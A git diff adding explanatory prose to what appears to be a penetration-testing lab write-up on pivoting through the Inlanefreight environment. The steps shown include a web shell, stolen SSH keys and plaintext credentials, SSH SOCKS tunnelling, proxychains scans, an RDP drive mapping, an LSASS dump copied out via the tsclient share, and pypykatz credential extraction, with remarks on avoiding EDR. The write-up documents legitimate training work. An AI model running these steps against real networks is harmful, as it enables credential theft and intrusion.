@@ -4408,7 +4408,13 @@ A team member started a Penetration Test against the Inlanefreight environment b
 <details>
 <summary><h3>Step 1</h3></summary>
 
-**1.1 - Navigate to `http://10.129.229.129/`**
+We start the engagement in the initial information gathering (reconnaissance) phase. By accessing the exposed web shell, our primary goal is to find valid access vectors to move laterally or establish persistence on the network.
+
+**Navigate to `http://10.129.229.129/` to access the web shell**
+
+**Listing the `/home` directory**
+
+We recursively list this directory to map out the legitimate system users—identifying `administrator` and `webadmin`—and to uncover any hidden files.
 
 <table width="100%">
 <tr>
@@ -4469,6 +4475,10 @@ ls: cannot open directory '/home/webadmin/.ssh': Permission denied
 </tr>
 </table>
 
+**Inspecting sensitive files**
+
+We read the unusual `for-admin-eyes-only` file, which reveals cleartext credentials (`mlefay` / `Plain Human work!`). We secure this critical finding for our upcoming pivot into the Windows environment.
+
 <table width="100%">
 <tr>
 <td colspan="2"> 🌐 <b>WebShell — p0wny@shell</b> </td>
@@ -4502,6 +4512,10 @@ Plain Human work!
 </td>
 </tr>
 </table>
+
+**Extracting SSH keys**
+
+We grab the `id_rsa` private key belonging to `webadmin`. This key acts as our access ticket, allowing us to upgrade from a restricted, unstable web shell to a fully interactive and reliable SSH session on the Linux machine.
 
 <table width="100%">
 <tr>
@@ -4576,9 +4590,13 @@ MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=
 <details>
 <summary><h3>Step 2</h3></summary>
 
-**1.2 - Copy the contents to our attack box**
+**Copy the contents to our attack box**
 
-**1.3 - Set restrictive permissions for the Private Key**
+We save the extracted SSH private key to our attack host and immediately restrict its permissions.
+
+**Set restrictive permissions for the Private Key**
+
+We do this because the SSH protocol enforces strict security checks on identity files. If a private key is broadly accessible or readable by anyone other than the file owner, the SSH client will consider it insecure and refuse to initiate the connection. Setting the permissions to `600` (read and write for the owner only) ensures the key is accepted as valid when we attempt to log into the target system.
 
 <table width="100%">
 <tr>
@@ -4605,7 +4623,11 @@ chmod 600 id_rsa
 <details>
 <summary><h3>Step 3</h3></summary>
 
-**1.4 - Establish SSH Session with Dynamic Port Forwarding**
+**Establish SSH Session with Dynamic Port Forwarding**
+
+We use the secured private key to establish a stable, interactive SSH session with the compromised Linux machine. More importantly, we include the `-D 1080` flag to set up _Dynamic Port Forwarding_.
+
+This creates a local SOCKS proxy on our attack host, acting as an encrypted tunnel. By routing our local tools (like Proxychains, Nmap, or RDP clients) through this proxy, we seamlessly transform the Linux machine into a pivot point, allowing us to interact with hidden internal networks and servers that are otherwise blocked from the outside.
 
 <table width="100%">
 <tr>
@@ -4648,7 +4670,9 @@ webadmin@inlanefreight:~$
 <details>
 <summary><h3>Step 4</h3></summary>
 
-**1.5 - Internal Network Interface Enumeration**
+**Internal Network Interface Enumeration**
+
+We need to understand the environment we just landed in, so we enumerate the network configuration of the compromised Linux machine to see what else it can talk to.
 
 <table width="100%">
 <tr>
@@ -4702,7 +4726,9 @@ ip add
 
 > **NOTE:** The system is multihomed. Interface `ens192` exposes the internal subnet `172.16.5.0/16`, which is not reachable from the external network.
 
-**1.6 - Internal Host Discovery (Ping Sweep)**
+**Internal Host Discovery (Ping Sweep)**
+
+We want to map this hidden network quietly without uploading external port scanners like Nmap. To do this, we use a native bash loop to perform a rapid ping sweep, sending a single ICMP echo request to every IP address in the subnet to see which ones respond.
 
 <table width="100%">
 <tr>
@@ -4743,7 +4769,11 @@ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "64 bytes" &); done
 <details>
 <summary><h3>Step 5</h3></summary>
 
-**1.7 - Validate Proxychains Configuration**
+We need to scan the newly discovered Windows machine for accessible services, but since it resides on an internal network, we must route our scanning tools through the SSH tunnel we created.
+
+**Validate Proxychains Configuration**
+
+We first verify the Proxychains configuration file to ensure it correctly points to the local SOCKS5 proxy (port 1080) we established earlier.
 
 <table width="100%">
 <tr>
@@ -4776,7 +4806,9 @@ socks5 127.0.0.1 1080
 </tr>
 </table>
 
-**1.8 - Nmap Port Scanning via SOCKS Proxy**
+**Nmap Port Scanning via SOCKS Proxy**
+
+We launch a targeted Nmap TCP connect scan through Proxychains to enumerate open ports. However, Nmap's aggressive, multi-threaded scanning behavior often overloads SOCKS proxies, causing packets to drop or time out. Consequently, Nmap falsely reports all targeted ports as "filtered."
 
 <table width="100%">
 <tr>
@@ -4821,9 +4853,9 @@ PORT     STATE    SERVICE
 </tr>
 </table>
 
-> **NOTE:** `Nmap` scans returned false negatives (filtered state) likely due to aggressive timeout settings and multi-threading conflicts with the SOCKS proxy routing.
+**Internal Service Enumeration via SOCKS Proxy (Netcat Fallback)**
 
-**1.9 Internal Service Enumeration via SOCKS Proxy (Netcat Fallback)**
+Recognizing the proxy limitation, we switch to a more reliable, manual technique. We use a single-threaded Bash loop with Netcat to probe each specific port one by one. This approach avoids tunnel saturation and successfully confirms that critical Windows remote management services (such as RDP, SMB, and RPC) are exposed and ready for our credentials.
 
 <table width="100%">
 <tr>
@@ -4860,14 +4892,20 @@ for port in 22 80 135 139 445 3389; do proxychains nc -zv 172.16.5.35 $port 2>&1
 </tr>
 </table>
 
-> **NOTE:** A manual TCP connection loop via netcat successfully bypassed this limitation, confirming active services on typical Windows ports (**SMB**, **RDP**, **RPC**).
-
 </details>
 
 <details>
 <summary><h3>Step 6</h3></summary>
 
-**1.10 RDP Session Establishment through SSH Tunnel**
+We leverage our established SSH proxy and the harvested credentials to gain a graphical Remote Desktop (RDP) session on the internal Windows server.
+
+**RDP Session Establishment through SSH Tunnel**
+
+We use `proxychains` to force the `xfreerdp` client's traffic through our local proxy, bridging the gap between our attack host and the isolated `172.16.5.35` machine.
+
+- We log in using the `mlefay` username and password we discovered hidden on the Linux web server during our initial reconnaissance.
+- We include the `/cert:ignore` flag to silently accept self-signed or untrusted SSL/TLS certificates, which are standard and expected in internal lab environments.
+- We strategically use the `/drive:kali_share,/tmp` flag to mount our local `/tmp` directory directly into the target Windows file system. This creates a seamless pipeline for easily uploading offensive tools to the target and exfiltrating sensitive data (like memory dumps) back to our attack box.
 
 <table width="100%">
 <tr>
@@ -4908,7 +4946,11 @@ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignor
 <details>
 <summary><h3>Step 7</h3></summary>
 
-**1.11 - Post-Exploitation: Internal Host Flag Retrieval**
+Now that we have successfully landed on the target Windows machine through our RDP session, we move to secure our objective for this phase of the engagement.
+
+**Post-Exploitation: Internal Host Flag Retrieval**
+
+We navigate to the root of the `C:\` drive and use the native Windows `type` command to read the contents of the `Flag.txt` file. This action captures the flag, serving as our definitive proof of compromise for this host and confirming our successful first pivot into the internal network.
 
 <table width="100%">
 <tr>
@@ -4946,6 +4988,12 @@ S1ngl3-Piv07-3@sy-Day
 <details>
 <summary><h3>Step 8 - Exfiltrating LSASS Dump via RDP Shared Drive</h3></summary>
 
+Our next objective is to harvest credentials to fuel our next jump deeper into the network. To achieve this, we target the Local Security Authority Subsystem Service (LSASS), which handles active user authentication and stores credentials in memory.
+
+**Dumping LSASS via Task Manager**
+
+We use the built-in Windows graphical interface to create a full memory dump of the `lsass.exe` process. This is a quiet, "Living off the Land" technique. By using native administrative tools instead of dropping known hacking executables (like Mimikatz) onto the disk, we minimize the risk of triggering antivirus or Endpoint Detection and Response (EDR) alerts while capturing valuable NTLM hashes or cleartext passwords left behind by other users.
+
 In the RDP Session, go to Task Manager > Details > Right Click `lsass.exe` > _Create dump file_
 
 ```text
@@ -4954,6 +5002,10 @@ The file has been successfully created
 The file is located at:
 C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
 ```
+
+**Exfiltrating via the RDP Share**
+
+We need to analyze this massive dump file offline on our attack host. Instead of setting up a noisy HTTP or SMB server to transfer the file, we use the `copy` command to send it directly to `\\tsclient\kali_share\`. This brilliantly leverages the local drive mapping we established during our initial RDP connection (Step 6), providing a secure, encrypted exfiltration tunnel that completely bypasses internal network firewalls.
 
 <table width="100%">
 <tr>
@@ -4990,6 +5042,12 @@ copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\kali_share\
 
 <details>
 <summary><h3>Step 9 - Extracting the credentials</h3></summary>
+
+We analyze the exfiltrated LSASS memory dump offline on our attack host to safely extract compromised credentials.
+
+**Evading Detection**
+
+By running a parsing tool like pypykatz locally rather than executing credential dumpers (like Mimikatz) directly on the compromised Windows server, we completely bypass the target's Antivirus and Endpoint Detection and Response (EDR) systems.
 
 <table width="100%">
 <tr>
@@ -5057,16 +5115,24 @@ luid 162552
 ...
 ```
 
-> **NOTE:** Analysis of the memory dump revealed that the user vfrank is vulnerable due to their credentials remaining stored in cleartext within the LSASS Kerberos authentication session.
-
 </td>
 </tr>
 </table>
+
+**Harvesting Cleartext Passwords**
+
+We scan the parsed memory sections and identify an active logon session for a new user, `vfrank`. Our analysis reveals that the Kerberos authentication provider has left their password (`Imply wet Unmasked!`) stored in cleartext. We secure these credentials, which will serve as our key to pivot even deeper into the Active Directory domain.
 
 </details>
 
 <details>
 <summary><h3>Step 10 - Second Pivot Network Enumeration</h3></summary>
+
+We need to map out the next layer of the internal network from our new vantage point on the compromised Windows server.
+
+**Network Enumeration**
+
+We check the local IP configuration to understand our reach. We discover a second network adapter (`172.16.6.35`), indicating this machine acts as a bridge to a third, deeper subnet (`172.16.6.0/16`).
 
 <table width="100%">
 <tr>
